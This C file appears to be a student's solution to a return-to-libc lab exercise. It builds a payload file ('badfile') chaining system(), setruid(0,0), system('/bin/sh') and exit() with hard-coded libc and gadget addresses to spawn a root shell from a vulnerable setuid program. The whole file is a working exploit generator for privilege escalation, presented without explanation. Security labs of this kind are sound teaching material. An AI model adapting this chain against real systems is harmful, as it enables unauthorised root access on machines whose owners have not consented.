#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[400];
  FILE *badfile;

  badfile = fopen("./badfile", "w");
  /* You need to decide the addresses and
the values for X, Y, Z. The order of the following
three statements does not imply the order of Xï¼ŒY, Z.
Actually, we intentionally scrambled the order. */
  *(long *)&buf[24] = 0xb7e5f430; //system()
  *(long *)&buf[28] = 0x80485b8;  //pop
  *(long *)&buf[32] = 0xbfffffc9; // echo A66666666
  *(long *)&buf[36] = 0xb7f07870; //setruid( )
  *(long *)&buf[40] = 0x80485b7;  //pop pop
  *(long *)&buf[44] = 0x00000000; //0
  *(long *)&buf[48] = 0x00000000; //0
  *(long *)&buf[52] = 0xb7e5f430; //system( )
  *(long *)&buf[56] = 0x80485b8;  // pop
  *(long *)&buf[60] = 0xbfffffbc; // /bin/sh
  *(long *)&buf[64] = 0xb7e52fb0; // exit()
  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}